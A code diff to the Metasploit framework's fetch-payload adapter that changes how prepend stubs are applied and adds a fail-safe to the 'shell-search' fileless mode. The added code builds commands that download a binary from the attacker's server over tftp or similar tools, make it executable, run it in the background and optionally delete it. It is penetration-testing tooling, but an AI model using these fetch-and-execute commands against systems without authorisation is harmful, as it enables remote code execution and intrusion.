@@ -106,6 +106,16 @@ module Msf::Payload::Adapter::Fetch
     Rex::Socket.to_authority(fetch_bindhost, fetch_bindport)
   end
 
+  # Unlike a normal payload, #generate here does not return raw payload bytes —
+  # it returns the fetch-and-execute shell command (curl/wget/etc.) to run on
+  # the target, staging the actual served payload binary as a side effect via
+  # #add_srv_entry. Because of that, prepend stubs (PrependFork,
+  # PrependSetuid, etc.) can't be applied at the #generate_complete layer the
+  # way other payload types do — that would run apply_prepends over the shell
+  # command string instead of the binary, corrupting it. Instead,
+  # apply_prepends is called at the two points below where the served
+  # payload's raw bytes actually get assembled, before they're handed to
+  # generate_payload_exe/add_srv_entry. See #generate_complete.
   def generate(opts = {})
     if opts[:dynamic_arch].nil?
       @srv_resources = []
@@ -120,7 +130,7 @@ module Msf::Payload::Adapter::Fetch
         add_srv_entry(srvuri, 'x', opts)
       else
         opts[:dynamic_arch] = false
-        opts[:code] = super(opts)
+        opts[:code] = apply_prepends(super(opts))
         add_srv_entry(srvuri, generate_payload_exe(opts), opts)
       end
 
@@ -136,8 +146,16 @@ module Msf::Payload::Adapter::Fetch
       vprint_status("Command to execute on target: #{cmd}")
       cmd
     else
-      super(opts)
+      apply_prepends(super(opts))
     end
+  end
+
+  # Intentionally not the inherited `apply_prepends(generate)`: prepends are
+  # already baked into the served payload bytes inside #generate, so
+  # reapplying apply_prepends here would double them up on the binary (or run
+  # them over the returned shell command, which isn't payload bytes at all).
+  def generate_complete
+    generate
   end
 
   # Dispatches command generation to the selected FETCH_COMMAND helper.
@@ -341,10 +359,27 @@ module Msf::Payload::Adapter::Fetch
   # @return [String] The command updated for POSIX execution.
   def _execute_nix(get_file_cmd)
     return _generate_fileless_shell(get_file_cmd, module_info['AdaptedArch']) if datastore['FETCH_FILELESS'] == 'shell'
-    return _generate_fileless_bash_search(get_file_cmd) if datastore['FETCH_FILELESS'] == 'shell-search'
     return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'
 
-    cmds = get_file_cmd
+    if datastore['FETCH_FILELESS'] == 'shell-search'
+      cmds = _generate_fileless_bash_search(get_file_cmd)
+      cmds << 'if [ $FOUND -eq 0 ]'
+      cmds << "; then f=#{_remote_destination_nix(failsafe: true)}; "
+      cmds << get_file_cmd
+      cmds << "; chmod +x #{_remote_destination_nix}"
+      cmds << "; #{_remote_destination_nix}& "
+
+      if datastore['FETCH_DELETE']
+        cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}; fi"
+      else
+        cmds << 'fi'
+      end
+
+      return cmds
+    else
+      cmds = get_file_cmd
+    end
+
     cmds << ";chmod +x #{_remote_destination_nix}"
     cmds << ";#{_remote_destination_nix}&"
     cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
@@ -452,13 +487,17 @@ module Msf::Payload::Adapter::Fetch
         fetch_command = _execute_win("tftp -i #{srvhost} GET #{uri} #{_remote_destination}")
       else
         _check_tftp_file
+        tftp_fetch_and_exec = "(echo binary ; echo get #{uri} ) | tftp #{srvhost}; chmod +x ./#{uri}; ./#{uri} &"
+        # Trailing `;` matters: the shell-search fail-safe branch below
+        # concatenates this string directly in front of a closing ` fi`.
+        tftp_fetch_and_exec << "sleep #{rand(3..7)};rm -rf ./#{uri};" if datastore['FETCH_DELETE']
         if datastore['FETCH_FILELESS'] != 'none' && linux?
           get_file_cmd = "(echo binary ; echo get #{uri} $f ) | tftp #{srvhost}"
           return _generate_fileless_shell(get_file_cmd, module_info['AdaptedArch']) if datastore['FETCH_FILELESS'] == 'shell'
-          return _generate_fileless_bash_search(get_file_cmd) if datastore['FETCH_FILELESS'] == 'shell-search'
+          return %(#{_generate_fileless_bash_search(get_file_cmd)} if [ $FOUND -eq 0 ]; then #{tftp_fetch_and_exec} fi) if datastore['FETCH_FILELESS'] == 'shell-search'
           return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'
         else
-          fetch_command = "(echo binary ; echo get #{uri} ) | tftp #{srvhost}; chmod +x ./#{uri}; ./#{uri} &"
+          fetch_command = tftp_fetch_and_exec
         end
       end
     else
@@ -514,11 +553,12 @@ module Msf::Payload::Adapter::Fetch
 
   # Returns or memoizes the remote payload destination for POSIX targets.
   #
+  # @param failsafe [Boolean] The argument determining whether destination is used in fail-safe part of fetch fileless or not.
   # @return [String] The POSIX destination path or fileless placeholder.
-  def _remote_destination_nix
-    return @remote_destination_nix unless @remote_destination_nix.nil?
+  def _remote_destination_nix(failsafe: false)
+    return @remote_destination_nix unless @remote_destination_nix.nil? || failsafe == true
 
-    if datastore['FETCH_FILELESS'] != 'none'
+    if datastore['FETCH_FILELESS'] != 'none' && failsafe == false
       @remote_destination_nix = '$f'
     else
       writable_dir = datastore['FETCH_WRITABLE_DIR']
@@ -527,6 +567,8 @@ module Msf::Payload::Adapter::Fetch
       payload_filename = datastore['FETCH_FILENAME']
       payload_filename = srvuri if payload_filename.blank?
       payload_path = writable_dir + payload_filename
+      return payload_path if failsafe
+
       @remote_destination_nix = payload_path
     end
     @remote_destination_nix
